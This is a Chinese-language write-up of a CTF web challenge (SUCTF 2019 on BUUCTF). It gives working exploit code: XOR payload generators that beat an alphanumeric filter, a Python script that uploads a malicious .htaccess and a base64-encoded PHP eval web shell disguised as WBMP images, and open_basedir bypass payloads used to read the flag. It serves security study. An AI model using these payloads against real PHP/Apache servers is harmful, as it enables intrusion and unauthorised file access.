# 知识点：

# 1.异或bypass

# 2. .htaccess上传导致任意文件执行

### 3. 使用.htaccess结合php://filter/convert.base64-decode/resource=

### base64编码绕过，文件中<?,php等字符的检测

# 4.open_basedir绕过

https://xz.aliyun.com/t/4720



参考链接：

https://www.xmsec.cc/suctf19-wp/

https://www.jianshu.com/p/fbfeeb43ace2

https://xz.aliyun.com/t/4720

https://www.cnpanda.net/ctf/383.html#menu_index_2



# 1.直接给出网页源码

```javascript
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!!
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
        mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
        if(preg_match("/ph/i",$extension)) die("^_^");
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
        if(!exif_imagetype($tmp_name)) die("^_^");
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```



# 2.源码分两个部分

## 第一部分：

## get参数导致任意文件执行

```javascript
$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
```

这里过滤了所有的字母和数字。此时正好可以使用无字母，数字bypass

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html



# 2.1 异或构造payload:



exp1:

```javascript
<?php
function gen($pl) {
    $aa = "";
    $bb = "";
    for ($j = 0; $j < strlen($pl); $j++) {
        for ($i = 0xa0; $i < 0xff; $i++) {
            if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($i)) == 0) {
                $t = chr($i) ^ $pl[$j];
                if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $t) == 0) {
                    $aa .= chr($i);
                    $bb .= $t;
                    break;
                }
            }
        }
    }
    return str_replace("%", "\x", urlencode($aa) . "^" . urlencode($bb) . "\r\n");
}
echo "_GET\r\n";
echo gen("_GET");
echo "_POST\r\n";
echo gen("_POST");
```



exp2:

```javascript
<?php

$str=urldecode('%ff%ff%ff%ff');
$get=urlencode(@_GET^"$str");
echo $get;
//解码回get
echo "\n";
echo urldecode('%A0%B8%BA%AB')^urldecode($str);
```



## 2.2 使用payload：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/66BB9268638E435498A460F04AB230AEclipboard.png)

直接使用system('ls');并不能造成命令执行，一是没回显，二是开启了open_basedir，禁用了很多遍函数。



2.3. 此时只能使用第二部分：

```javascript
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!!
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
        mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
        if(preg_match("/ph/i",$extension)) die("^_^");
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
        if(!exif_imagetype($tmp_name)) die("^_^");
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}
```

该函数可以上传文件。但是会检测文件内容：ph,<?都无法使用。



此时只有一个方法，上传.htaccess文件将，另外上传的文件当做php执行文件。



exp:

```javascript
import requests
import base64

url = "http://e6934d21-0f78-4fc7-b24c-9e49073933b7.node3.buuoj.cn/?_=${`%`fe%fe%fe%fe^%a1%b9%bb%aa}{`%`fe}();&%fe=get_the_flag"


htaccess = b"""\x00\x00\x8a\x39\x8a\x39
AddType application/x-httpd-php .cc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"

"""

shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"<?php eval($_GET['c']);?>")
#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"<script language='php'>eval($_REQUEST[c]);</script>"

files = [('file',('.htaccess',htaccess,'image/jpeg'))]

data = {"upload":"Submit"}

# 上传.httaccess
proxies = {"http":"http://127.0.0.1:8080"}
r = requests.post(url=url, data=data, files=files)#proxies=proxies)
print(r.text)

# 上传shell.cc
files = [('file',('shell.cc',shell,'image/jpeg'))]
r = requests.post(url=url, data=data, files=files)
print(r.text)
```



# 3. exp解释

## 3.1 上传.htaccess

```javascript
htaccess = b"""\x00\x00\x8a\x39\x8a\x39
AddType application/x-httpd-php .cc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"

"""

# 上传.httaccess
proxies = {"http":"http://127.0.0.1:8080"}
r = requests.post(url=url, data=data, files=files)#proxies=proxies)
print(r.text)
```



## 3.2 .htaccess文件内容意思：

### 3.2.1 ：将 .cc结尾的文件当做php文件执行

### 3.2.2 ：最关键的地方：

```javascript
php_value auto_append_file "php://filter/convert.base64-decode/resource=
/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"
```

执行文件时自动加上：shell.cc文件的内容，

并且将shell.cc文件的内容base64解码

即在任意执行的.cc文件的后面加上shell.cc文件 base64解码后的内容



shell.cc文件上传时经过了base64编码，绕过了ph,<?内容检测，而后.htaccess文件将内容base64解码回来，构成shell文件



## 3.3 shell.cc文件内容意思：

```javascript
shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"<?php eval($_GET['c']);?>")

files = [('file',('shell.cc',shell,'image/jpeg'))]
r = requests.post(url=url, data=data, files=files)
print(r.text)
```



## 3.3.1 将<?php eval($_GET['c']);?>base64编码绕过文件内容检测





## 3.4 \x00\x00\x8a\x39\x8a\x39 意思：

### 3.4.1 ： \x00 使用\x00开头会被配置文件当做无效行来处理，类似于注释符

### 3.4.2 ：接下来就需要找到\x00开头的文件。

### 3.4.3 ： wbmp图片文件就是以\x00开头

### 3.4.4 ：\x00\x00\x8a\x39\x8a\x39就是wbmp文件的文件头

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/ACB1B31019B5423AAA1C343621024EC1clipboard.png)

可用的还有ico文件头



## 4. 上传文件之后就可以命令执行

但是发现开启了：open_basedir限制

绕过：https://xz.aliyun.com/t/4720

```javascript
chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));
#绕后用file_get_contents读就好了
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/158C8AD222ED4F4CBA01F352637092D9clipboard.png)

得到flag文件的文件名



接着：

```javascript
shell.cc?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents("/THis_Is_tHe_F14g"));
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/C2509C4CB1584BF3AC06F3A8F9E9B2DAclipboard.png)

